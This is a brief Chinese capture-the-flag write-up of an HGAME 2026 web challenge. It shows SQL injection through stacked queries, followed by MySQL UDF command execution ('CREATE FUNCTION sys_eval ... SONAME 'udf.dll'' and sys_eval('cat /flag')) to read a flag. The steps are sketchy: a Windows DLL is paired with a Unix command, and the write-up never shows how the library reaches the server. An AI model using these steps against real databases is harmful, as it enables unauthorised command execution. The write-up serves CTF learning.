---
title: "web_unpack — 堆叠查询 + UDF 提权"
date: 2026-05-01
event: "HGAME 2026"
category: "Web"
difficulty: "Medium"
tags: ["SQL注入", "UDF提权", "RCE"]
rank: 3
team: "TTTeam"
---

## 漏洞发现

登录页面存在 SQL 注入点，`into outfile` 被禁用，但堆叠查询未被过滤。

```sql
SELECT user(), current_user();
-- 结果: root@localhost
```

## 利用思路

通过 UDF 提权执行系统命令：

```sql
CREATE FUNCTION sys_eval RETURNS string SONAME 'udf.dll';
SELECT sys_eval('cat /flag');
```

## Flag 获取

成功获取 Flag：`flag{st4ck3d_qu3ry_udf_pr1v3sc}`

## 总结

本题考察 SQL 堆叠查询 + MySQL UDF 提权的组合利用。
